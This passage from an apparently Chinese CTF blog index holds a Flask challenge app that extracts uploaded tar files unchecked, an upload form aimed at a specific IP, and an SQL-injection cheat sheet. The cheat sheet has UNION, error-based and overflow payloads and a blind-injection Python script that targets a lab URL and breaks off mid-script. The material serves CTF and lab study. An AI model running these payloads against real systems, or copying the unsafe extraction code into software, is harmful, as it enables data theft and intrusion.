class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>管他那么多，先整一个上传页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;upload-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://1.14.71.254:28597/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span></span><br><span class="line">　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/WEB/">WEB</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/ETH/">ETH</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/Solidity/">Solidity</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/upload/">upload</a></div><hr></div></article></div><!--!--><div class="card"><div class="card-image"><a class="image is-7by3" href="/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/"><img class="fill" src="/images/sql.jpeg" alt="SQL注入备忘录"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-15  <a class="commentCountImg" href="/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/#comment-container"><span class="display-none-class">ac4653b9cb3724e131542849f033e1f4</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="ac4653b9cb3724e131542849f033e1f4">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>22 分钟  <i class="fas fa-pencil-alt"> </i>3.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/">SQL注入备忘录</a></h1><div class="content"><p>最近在用<code>sql-lib</code>学sql注入，零零散散的笔记整了一大堆，现在整合一下，做个备忘录，方便比赛的时候方便查询。</p>
<h1 id="典中典版本"><a href="#典中典版本" class="headerlink" title="典中典版本:"></a>典中典版本:</h1><p><code>爆库版本</code>: <code>?id=-1&#39; union select 1,database(),3--+</code><br><code>爆库</code>: <code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code><br><code>爆表</code>: <code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;数据库&#39;#</code><br><code>爆字段</code>: <code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;数据表&#39;#</code><br>这几个出来了，剩下的就不用我说了吧qwq</p>
<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数:"></a>常用函数:</h1><table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>system_user()</td>
<td>系统用户名</td>
</tr>
<tr>
<td>user()</td>
<td>用户名</td>
</tr>
<tr>
<td>session_user()</td>
<td>连接数据库的用户名</td>
</tr>
<tr>
<td>database()</td>
<td>数据库名</td>
</tr>
<tr>
<td>version()</td>
<td>MYSQL数据库版本</td>
</tr>
<tr>
<td>load_file()</td>
<td>MYSQL读取本地文件的函数</td>
</tr>
<tr>
<td>@@datadir</td>
<td>读取数据库路径</td>
</tr>
<tr>
<td>@@basedir MYSQL</td>
<td>安装路径</td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>操作系统</td>
</tr>
</tbody></table>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入:"></a>报错注入:</h1><h2 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h2><p>都会，不解释了。<br>公式:<code>extractvalue(数字,concat(0x7e,(查询语句),0x7e))</code></p>
<h2 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h2><p>都会，不解释了。<br>公式:<code>updatexml(数字,concat(0x7e,(查询语句),0x7e),数字)</code></p>
<h2 id="溢出报错"><a href="#溢出报错" class="headerlink" title="溢出报错"></a>溢出报错</h2><h3 id="exp函数溢出-mysql-gt-5-5-53"><a href="#exp函数溢出-mysql-gt-5-5-53" class="headerlink" title="exp函数溢出 | mysql&gt;5.5.53"></a>exp函数溢出 | mysql&gt;5.5.53</h3><p>原理:当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误,用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~(select version());</span><br><span class="line">+----------------------+</span><br><span class="line">| ~(select version())  |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551610 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from(select version())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;5.5.44-0ubuntu0.14.04.1&#x27; from dual)))&#x27;</span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
<p>公式:<code>select exp(~(select * from(查询语句)x));</code><br>支持load_file,最多13行</p>
<h3 id="BIGINT溢出"><a href="#BIGINT溢出" class="headerlink" title="BIGINT溢出"></a>BIGINT溢出</h3><p>差不多同样的原理，可以报错<br>公式:<code>select 1+~(select*from(查询语句)x);</code><br>同理，其他的函数也可以这么干:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select !atan((select*from(查询语句)a))-~0;</span><br><span class="line">select !ceil((select*from(查询语句)a))-~0;</span><br><span class="line">select !floor((select*from(查询语句)a))-~0;</span><br></pre></td></tr></table></figure>

<p>其他能利用的函数…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HEX</span><br><span class="line">IN</span><br><span class="line">FLOOR</span><br><span class="line">CEIL</span><br><span class="line">RAND</span><br><span class="line">CEILING</span><br><span class="line">TRUNCATE</span><br><span class="line">TAN</span><br><span class="line">SQRT</span><br><span class="line">ROUND</span><br><span class="line">SIGN</span><br><span class="line">EXP</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="group-by-注入-表中的数据至少要为三条才可以注入成功"><a href="#group-by-注入-表中的数据至少要为三条才可以注入成功" class="headerlink" title="group by 注入 | 表中的数据至少要为三条才可以注入成功"></a>group by 注入 | 表中的数据至少要为三条才可以注入成功</h2><p>原理:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53065491/article/details/121893986">group_by注入</a></p>
<p>公式:<code>select count(*) from information_schema.tables group by concat((查询语句),floor(rand()*2));</code><br>效率比较低qwq而且还有猜错的可能</p>
<h1 id="无select注入-MySQL-8"><a href="#无select注入-MySQL-8" class="headerlink" title="无select注入 | MySQL 8"></a>无select注入 | MySQL 8</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231627">浅谈利用mysql8新特性进行SQL注入</a><br>脚本搬到这里了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@author qwzf</span></span><br><span class="line"><span class="string">@desc 本脚本是用于mysql 8新特性的sql注入</span></span><br><span class="line"><span class="string">@date 2021/02/18</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://121.41.231.75:8002/Less-8/?id=&#x27;</span></span><br><span class="line">chars=string.ascii_letters+string.digits+<span class="string">&quot;@&#123;&#125;_-?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">current_db</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;利用mysql8新特性或普通布尔盲注:\n1.新特性(联合查询) 2.普通布尔盲注&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入序号:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        payload = <span class="string">&quot;-1&#x27; union values row(1,database(),3)--+&quot;</span>  <span class="comment">#联合查询爆当前数据库(可修改)</span></span><br><span class="line">        urls = url + payload</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and ascii(substr((database()),&#123;0&#125;,1))=&#123;1&#125;--+&quot;</span> <span class="comment">#布尔盲注爆当前数据库(可修改)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">            char=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += j</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    char = j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">name</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbs</span>(<span class="params">url</span>): <span class="comment">#无列名盲注爆所有数据库(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据库，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(x)</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#123;&#125;,&#x27;&#x27;,4,5,6)&gt;(table information_schema.schemata limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tables_n</span>(<span class="params">url,database</span>): <span class="comment">#无列名盲注爆数据表开始行数(可修改)</span></span><br><span class="line">    payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &#123;&#125;,1)--+&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">        payloads = payload.<span class="built_in">format</span>(i)</span><br><span class="line">        urls = url + payloads</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(database[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">            database = database[<span class="number">0</span>:-<span class="number">1</span>]+char</span><br><span class="line">            payld = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">            urls = url + payld</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;从第&#x27;</span>,i,<span class="string">&#x27;行开始爆数据表&#x27;</span>)   <span class="comment">#判断开始行数</span></span><br><span class="line">                n = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tables</span>(<span class="params">url,database,n</span>):  <span class="comment">#无列名盲注爆数据表(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据表，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(x + n)</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#123;&#125;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columns_n</span>(<span class="params">url,database,table</span>): <span class="comment">#无列名盲注爆字段开始行数(可修改)</span></span><br><span class="line">    payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+table+<span class="string">&quot;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &#123;&#125;,1)--+&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3000</span>,<span class="number">10000</span>):</span><br><span class="line">        payloads = payload.<span class="built_in">format</span>(i)</span><br><span class="line">        urls = url + payloads</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(table[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">            table = table[<span class="number">0</span>:-<span class="number">1</span>]+char</span><br><span class="line">            payld = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+table+<span class="string">&quot;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">            urls = url + payld</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;从第&#x27;</span>,i,<span class="string">&#x27;行开始爆字段&#x27;</span>)   <span class="comment">#判断开始行数</span></span><br><span class="line">                n = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columns</span>(<span class="params">url,database,table,n</span>):  <span class="comment">#无列名盲注爆字段值(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个字段，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(x + n)</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+table+<span class="string">&quot;&#x27;,&#123;&#125;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">      